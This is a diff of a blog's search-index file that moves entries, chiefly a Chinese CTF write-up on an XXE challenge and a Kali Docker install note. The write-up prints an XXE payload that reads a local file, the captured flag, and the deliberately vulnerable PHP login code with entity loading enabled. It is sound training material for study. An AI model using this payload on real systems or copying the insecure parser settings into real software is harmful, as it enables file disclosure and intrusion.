@@ -410,6 +410,92 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
+    <title>xxe</title>
+    <url>/2023/07/XXE/</url>
+    <content><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码	</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick<span class="token operator">=</span><span class="token string">"XMLFunction()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看xml格式<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
+        <span class="token keyword">function</span> <span class="token function">XMLFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>
+                <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?>'</span> <span class="token operator">+</span>
+            <span class="token string">'&lt;root>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;username>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/username>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;password>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/password>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;/root>'</span><span class="token punctuation">;</span>
+            <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token function">alert</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"login.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造xxe攻击<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是post包<code>传的时候记得把注释删去</code></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY flag SYSTEM "file:///flag"><span class="token comment">&lt;!--构造实体--></span>
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--输出flag实体--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2333<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
+<p><img src= "/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+* autor: c0ny1
+* date: 2018-2-7
+*/</span>
+
+<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
+<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
+	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>	
+<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
+<ul>
+<li>etc&#x2F;hosts </li>
+<li>proc&#x2F;net&#x2F;arp<br><img src= "/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub-rce</title>
     <url>/2023/07/ctfhub-rce/</url>
     <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行ping和远程代码执行evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞</strong>。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
@@ -550,125 +636,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
-    <title>xxe</title>
-    <url>/2023/07/XXE/</url>
-    <content><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码	</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick<span class="token operator">=</span><span class="token string">"XMLFunction()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254264857-190.png" alt="在这里插入图片描述">抓包看xml格式<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254267429-193.png" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
-        <span class="token keyword">function</span> <span class="token function">XMLFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>
-                <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?>'</span> <span class="token operator">+</span>
-            <span class="token string">'&lt;root>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;username>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/username>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;password>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/password>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;/root>'</span><span class="token punctuation">;</span>
-            <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    <span class="token function">alert</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-                <span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#125;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"login.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>构造xxe攻击<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254269819-196.png" alt="在这里插入图片描述">这是post包<code>传的时候记得把注释删去</code></p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY flag SYSTEM "file:///flag"><span class="token comment">&lt;!--构造实体--></span>
-</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--输出flag实体--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2333<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
-<p><img src= "/img/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "/img/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">/**
-* autor: c0ny1
-* date: 2018-2-7
-*/</span>
-
-<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
-<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
-<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
-
-<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
-	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
-	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>	
-<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
-<ul>
-<li>etc&#x2F;hosts </li>
-<li>proc&#x2F;net&#x2F;arp<br><img src= "/img/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali安装docker</title>
-    <url>/2023/07/docker/</url>
-    <content><![CDATA[<h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update
-<span class="token function">apt-get</span> <span class="token function">install</span> docker-engine
-<span class="token comment"># 安装结束，打开docker服务</span>
-<span class="token function">service</span> <span class="token function">docker</span> start
-<span class="token comment"># 验证安装，运行测试样例</span>
-<span class="token function">docker</span> <span class="token parameter variable">--version</span>
-<span class="token function">docker</span> run hello-world
-<span class="token comment">#测试</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token parameter variable">--version</span>
-<span class="token function">docker</span> images
-<span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span>
-<span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> <span class="token number">123</span> <span class="token parameter variable">-p</span> <span class="token number">127.0</span>.0.1:80:80 镜像名
-<span class="token function">docker</span> stop <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><a href="https://www.runoob.com/docker/docker-command-manual.html">其他常用命令见菜鸟教程</a></p>
-<h1 id="dockers底层原理"><a href="#dockers底层原理" class="headerlink" title="dockers底层原理"></a>dockers底层原理</h1><h2 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h2><blockquote>
-<p>命名空间是 Linux 为我们提供的<code>用于分离进程树、网络接口、挂载点以及进程间通信等资源</code>的方法。在日常使用Linux时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
-</blockquote>
-<h2 id="CGroups"><a href="#CGroups" class="headerlink" title="CGroups"></a>CGroups</h2><blockquote>
-<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们<code>提供物理资源上的隔离</code>，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I&#x2F;O 和网络带宽。<br><code>在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</code></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>kali</tag>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2023/07/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p>先看源码没发现啥</p>
@@ -759,6 +726,39 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       <tags>
         <tag>web</tag>
         <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装docker</title>
+    <url>/2023/07/docker/</url>
+    <content><![CDATA[<h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update
+<span class="token function">apt-get</span> <span class="token function">install</span> docker-engine
+<span class="token comment"># 安装结束，打开docker服务</span>
+<span class="token function">service</span> <span class="token function">docker</span> start
+<span class="token comment"># 验证安装，运行测试样例</span>
+<span class="token function">docker</span> <span class="token parameter variable">--version</span>
+<span class="token function">docker</span> run hello-world
+<span class="token comment">#测试</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token parameter variable">--version</span>
+<span class="token function">docker</span> images
+<span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span>
+<span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> <span class="token number">123</span> <span class="token parameter variable">-p</span> <span class="token number">127.0</span>.0.1:80:80 镜像名
+<span class="token function">docker</span> stop <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a href="https://www.runoob.com/docker/docker-command-manual.html">其他常用命令见菜鸟教程</a></p>
+<h1 id="dockers底层原理"><a href="#dockers底层原理" class="headerlink" title="dockers底层原理"></a>dockers底层原理</h1><h2 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h2><blockquote>
+<p>命名空间是 Linux 为我们提供的<code>用于分离进程树、网络接口、挂载点以及进程间通信等资源</code>的方法。在日常使用Linux时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
+</blockquote>
+<h2 id="CGroups"><a href="#CGroups" class="headerlink" title="CGroups"></a>CGroups</h2><blockquote>
